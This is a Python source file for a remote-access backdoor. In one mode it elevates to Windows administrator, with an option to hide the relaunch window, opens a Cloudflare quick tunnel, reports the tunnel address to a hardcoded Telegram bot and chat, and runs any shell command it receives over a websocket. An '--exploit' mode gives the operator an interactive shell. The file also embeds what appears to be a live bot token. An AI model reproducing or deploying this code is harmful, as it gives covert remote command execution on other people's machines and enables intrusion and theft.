from re import search
from aiogram import Bot
from ctypes import windll
from os import getcwd, chdir
from dataclasses import dataclass
from websockets import serve, connect
from sys import executable, argv, exit
from subprocess import Popen, PIPE, STDOUT, run
from asyncio import run as async_run, Future, to_thread


@dataclass
class Config:
    port: int = 3301
    host: str = "0.0.0.0"
    chat_id: int = 8810484379
    token: str = "8828822456:AAEuFpjZiiv0ocGFoAiqGfHXGlj0dm-n67Y"
    url: str | None = None

    def __post_init__(self):
        self.bot = Bot(self.token)


class Client(Config):
    def __init__(self):
        super().__init__()
        self.url = argv[2].replace("https://", "wss://")

    async def run(self):
        async with connect(self.url) as websocket:
            while True:
                command = input("[Shell] > ").strip()

                if command == "exit":
                    return

                if command in ("cls", "clear"):
                    print("\x1b[2J\x1b[H", end="")
                    continue

                if not command:
                    continue

                await websocket.send(command)
                print(await websocket.recv())


class Server(Config):
    def __init__(self):
        super().__init__()

    async def listener(self, websocket):
        async for command in websocket:
            command = command.strip()

            if command.startswith("cd"):
                path = command[2:].strip()
                if not path:
                    await websocket.send(getcwd())
                    continue
                try:
                    chdir(path)
                    await websocket.send(getcwd())
                except Exception as e:
                    await websocket.send(f"cd error: {e}")
                continue

            output = await to_thread(
                lambda c: run(
                    c,
                    shell=True,
                    capture_output=True,
                    text=True,
                    cwd=getcwd(),
                    encoding="utf-8",
                    errors="ignore"
                ).stdout,
                command
            )

            await websocket.send(output or "")

    def create_tunnel(self):
        print("Initializing the tunnel...")
        process = Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{self.port}"],
            stdout=PIPE,
            stderr=STDOUT,
            text=True,
            encoding="utf-8",
            errors="ignore",
            bufsize=1
        )

        for row in iter(process.stdout.readline, ""):
            match = search(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com", row)
            if match:
                self.url = match.group(0).replace("https://", "wss://")
                return self.url

        return None

    async def run(self):
        if not windll.shell32.IsUserAnAdmin():
            windll.shell32.ShellExecuteW(
                None,
                "runas",
                executable,
                " ".join(argv),
                None,
                int("--silent" not in argv)
            )
            exit()

        if self.create_tunnel():
            print("Tunnel:", self.url)

            await self.bot.send_message(self.chat_id, self.url)
            await self.bot.session.close()

            print(f"The message was sent to ID: {self.chat_id}")

            async with serve(self.listener, self.host, self.port):
                await Future()


if __name__ == "__main__":
    async_run(Client().run()) if "--exploit" in argv else async_run(Server().run())